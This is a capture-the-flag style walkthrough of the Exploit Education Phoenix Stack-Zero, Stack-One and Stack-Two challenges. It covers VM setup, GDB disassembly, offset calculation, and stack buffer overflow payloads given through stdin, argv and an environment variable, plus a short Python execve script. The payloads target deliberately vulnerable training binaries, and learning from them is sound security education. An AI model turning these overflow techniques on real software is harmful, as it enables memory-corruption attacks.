#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

# Stack-Zero

**Challenge**: [Phoenix/Stack-Zero](https://exploit.education/phoenix/stack-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable.

---

## Starting the Challenge

```bash
cd /opt/phoenix/amd64
./stack-zero
```

We see the following:

![intro](/assets/phoenix/hello.png)

It’s waiting for input — but it complains that `'changeme' has not yet been changed.`

---

## Initial Hypothesis

> My noob experience says that we have to change env variable `changeme` address or smth,
> I will avoid looking at source code — let’s f around.

---

## GDB Setup and Disassembly

Spun up GDB and dumped the disassembly of `main`:

![disassemble](/assets/phoenix/assembly.png)

This is the disassembled version. After setting a breakpoint at `main` and stepping through instructions, I understood the control flow. It looks something like:

![control flow](/assets/phoenix/control.jpg)

---

## Observing Behavior

From the disassembly, the goal is to bypass this check and reach the uncalled `puts()` that prints the success message.

To test this, I patched the binary to skip the conditional jump using EFLAGS:

![poc](/assets/phoenix/poc.png)

Boom! Got the success message:

> **Well done, the 'changeme' variable has been changed!**

---

## Deeper Static Analysis

Reading the assembly slowly, we find three important stack variables:

* `rbp-0x10`
* `rbp-0x54`
* `rbp-0x60`

Out of these, `rbp-0x10` seems like the flag `changeme` due to the following logic:

```asm
mov DWORD PTR [rbp-0x10], 0x0     ; initialize changeme = 0
...
call gets                         ; read input into buffer
mov eax, DWORD PTR [rbp-0x10]     ; load changeme
test eax, eax                     ; check if zero
je 0x40061c                       ; jump to fail if changeme == 0
```

So, `changeme` is at `rbp-0x10` and the input buffer is at `rbp-0x50`.

### Key Insight:

To overflow `changeme`, we need to write past the buffer:

``` assembly
0x50 - 0x10 = 0x40 = 64 bytes
```
![calculate](/assets/phoenix/caclu.jpg)

---

## The Exploit

Let’s test a buffer with 65 characters to overwrite the 64-byte buffer and flip `changeme`.

```bash
./stack-zero
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Result:

![success](/assets/phoenix/success.png)

Success!  We changed the `changeme` variable with a simple overflow.

---

## Summary

| Component  | Address      | Role             |
| ---------- | ------------ | ---------------- |
| `changeme` | `rbp-0x10`   | Flag we must set |
| `input`    | `rbp-0x50`   | 64-byte buffer   |
| `gets()`   |  Vulnerable  | No bounds check  |

### Exploit Strategy:

* Overflow 64 bytes into `changeme` by inputting 65+ characters.
* This causes the `test eax, eax` check to pass.
* We reach the success path and win.

---

## Takeaways

* `gets()` is dangerous — never use it.
* This challenge demonstrates a classic **stack-based buffer overflow**.
* You don’t always need the source — static and dynamic analysis (like GDB + disasm) is powerful.

# Stack-One

**Challenge**: [Phoenix/Stack-One](https://exploit.education/phoenix/stack-one/)

**Goal**: Overflow the buffer and set the correct value in a target variable to trigger the success path.

---

## Starting the Challenge

```bash
cd /opt/phoenix/amd64
./stack-one
```

![intro.png](/assets/phoenix/intro.png)

Hmm… Lets make this challenge a little interesting, ready? Evil smirks**

Strips the binary and spuns gdb---

```
cp /tmp/my-one stack-zero
strip /tmp/my-one
```
---
Analysis


```bash
gdb -nx /tmp/my-one
```

![strip](/assets/phoenix/strip.png)

``` bash
info files
```
[info](/assets/phoenix/info.png)

This gives us the entry point — e.g., `0x400500`. We dump 100 instructions:

```bash
x/100i 0x400500
```

![disass](/assets/phoenix/disass.png)

We see that `__libc_start_main@plt` is called and `%edi` is loaded with some value before that — that value is our real `main()` address (System V ABI).

---

## Locating `main()`

Let’s jump to the function in `%edi`, e.g., `0x40066d`:

```bash
x/40i 0x40066d
```

We now have the disassembly of the real main function.

---

## Disassembly Observations

Key lines:

```asm
=> 0x40066d:    push   rbp
   0x40066e:    mov    rbp,rsp
   0x400671:    sub    rsp,0x60
   0x400675:    mov    DWORD PTR [rbp-0x54],edi
   0x400678:    mov    QWORD PTR [rbp-0x60],rsi
   0x40067c:    mov    edi,0x400750
   0x400681:    call   0x4004c0 <puts@plt>
   0x400686:    cmp    DWORD PTR [rbp-0x54],0x1
   0x40068a:    jg     0x4006a0
   0x40068c:    mov    esi,0x4007a0
   0x400691:    mov    edi,0x1
   0x400696:    mov    eax,0x0
   0x40069b:    call   0x4004d0 <errx@plt>
   0x4006a0:    mov    DWORD PTR [rbp-0x10],0x0
   0x4006a7:    mov    rax,QWORD PTR [rbp-0x60]
   0x4006ab:    add    rax,0x8
   0x4006af:    mov    rdx,QWORD PTR [rax]
   0x4006b2:    lea    rax,[rbp-0x50]
   0x4006b6:    mov    rsi,rdx
   0x4006b9:    mov    rdi,rax
   0x4006bc:    call   0x4004a0 <strcpy@plt>
   0x4006c1:    mov    eax,DWORD PTR [rbp-0x10]
   0x4006c4:    cmp    eax,0x496c5962
   0x4006c9:    jne    0x4006d7
   0x4006cb:    mov    edi,0x4007d8
   0x4006d0:    call   0x4004c0 <puts@plt>
   0x4006d5:    jmp    0x4006eb
   0x4006d7:    mov    eax,DWORD PTR [rbp-0x10]
   0x4006da:    mov    esi,eax
   0x4006dc:    mov    edi,0x400820
   0x4006e1:    mov    eax,0x0
   0x4006e6:    call   0x4004b0 <printf@plt>
   0x4006eb:    mov    edi,0x0
   0x4006f0:    call   0x4004e0 <exit@plt>
```
By observing the above assembly we could determine the control flow:

## Stack Variables

From the layout:

| Variable   | Offset     | Notes                         |
| ---------- | ---------- | ----------------------------- |
| `argc`     | `rbp-0x54` | from `%edi`                   |
| `argv`     | `rbp-0x60` | from `%rsi`                   |
| `buffer`   | `rbp-0x50` | gets `argv[1]` via `strcpy()` |
| `changeme` | `rbp-0x10` | compared against `0x496c5962` |

---

## Exploitation Plan

We need to overwrite (`rbp-0x10`) with `0x496c5962`.

Given:

```
0x50 - 0x10 = 0x40 = 64 bytes
```

This means:

* Input buffer is 64 bytes long
* To overwrite, input must be **64 bytes of junk + 4-byte value**

---

## Exploit

```bash
./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
```

Why this works:

* Little-endian architecture
* `0x496c5962` = `"blyb"` in hex → reversed in memory as `\x62\x59\x6c\x49`

---

## Result

![success](/assets/phoenix/success1.png)

We have correctly set the correct value in a target variable!

---

## Summary

| Component     | Offset     | Role                     |
| ------------- | ---------- | ------------------------ |
| `changeme`    | `rbp-0x10` | Flag value to override   |
| `buffer`      | `rbp-0x50` | Target of `strcpy()`     |
| Overflow size | 64 + 4     | 64-byte buffer + 4 bytes |

---

## Key Takeaways

* No bounds check on `strcpy` = classic buffer overflow opportunity.
* Stripped binaries can be reversed by observing calling conventions.
* Static + dynamic analysis is often enough — no source needed.

# Stack-Two

**Challenge**: [Phoenix/Stack-Two](https://exploit.education/phoenix/stack-two/)

**Goal**: Overflow the stack-based buffer and set the correct value via an environment variable.

---
![input](/assets/phoenix/output.png)

## Initial Observations
We spin up GDB and:

![gdb](/assets/phoenix/gdb.png)

Okay wow — before I could strip the binary, it did it itself... (partially).

```bash
disassemble main
```
![assembly](/assets/phoenix/ass.png)

No peeking at source again — I’ll try to trace and build a control flow map manually.

---

## Control Flow & Parameters

![controlflow](/assets/phoenix/control2.jpg)

We can immediately observe use of `argc/argv` and a call to `getenv()` — a standard C library function for retrieving environment variables.

### getenv() Overview:

```c
char *getenv(const char *name);
```

* Takes one string argument — the name of the env var
* Returns a pointer to its value or `NULL` if not found
* Return value lives in `rax`

From this:

```
0x4006c6: mov edi, 0x4007da         ; "ExploitEducation"
0x4006cb: call getenv
0x4006d0: mov [rbp-0x8], rax
0x4006d4: cmp [rbp-0x8], 0x0
0x4006d9: jne 0x4006ef              ; if NULL, die
```

So, if `getenv()` returns `NULL` (i.e., the env variable is missing), we hit an `errx()` call:

```
stack-two: please set the ExploitEducation environment variable
```
and futhermore,

getenv's arguemnent must be string so lets check string stored in `0x4007da` (edi)

![Exploitedu](/assets/phoenix/ExploitEdu.png)

---

## Exploiting the Buffer

Eventually we hit:

```
0x4006fa: lea rax, [rbp-0x50]
0x4006fe: mov rsi, rdx
0x400701: mov rdi, rax
0x400704: call strcpy
```

Which copies the env value (from `rdx`) to our local buffer at `rbp-0x50`.

Then the same old pattern appears again:

```
0x4006ef: mov DWORD PTR [rbp-0x10], 0x0        ; changeme = 0
...
0x400709: mov eax, DWORD PTR [rbp-0x10]
0x40070c: cmp eax, 0xd0a090a
```

We need to overflow from `rbp-0x50` (input buffer) to `rbp-0x10` (target `changeme`), just like previous challenges.

---

### Gotcha:

The input is not taken directly from `argv`, but from the env variable named `"ExploitEducation"`.

---

## Calculating the Offset

Same math:

```
0x50 - 0x10 = 0x40 = 64 bytes
```

Little endian again — we’ll write the target value in reverse byte order.

```bash
\x0a\x09\x0a\x0d  -->  0xd0a090a
```

---

## The Payload

You can do this two ways:

### Terminal One-Liner:

```bash
ExploitEducation=$(python3 -c 'print("A"*64 + "\x0a\x09\x0a\x0d")') ./stack-two
```

### Python Script (cleaner for automation):

```python
import os

env = os.environ.copy()
env["ExploitEducation"] = b"A"*64 + b"\x0a\x09\x0a\x0d"

binary = "./stack-two"
argv = [binary.encode()]

os.execve(binary, argv, env)
```

---

## Result

![result](/assets/phoenix/success2.png)

```
Well done, you have successfully set changeme to the correct value.
```

Successful overflow via environment variable!

---

## Summary

|Component      | Value              | Role                      |
| ------------- | ------------------ | ------------------------- |
| changeme       | `rbp-0x10`         | Value we need to control  |
|  Buffer       | `rbp-0x50`         | 64 bytes, copied from env |
|  Env var      | "ExploitEducation" |        `getenv()`         |

---

## Takeaways

* Not all overflows come from `argv` or `gets()` — this one uses `getenv()`.
* Environment-based attacks are very real (especially in C binaries).
* Always use bounds-safe functions like `strncpy()` or better, not `strcpy()`.
* Even stripped binaries give away control flow with just GDB + disassembly.
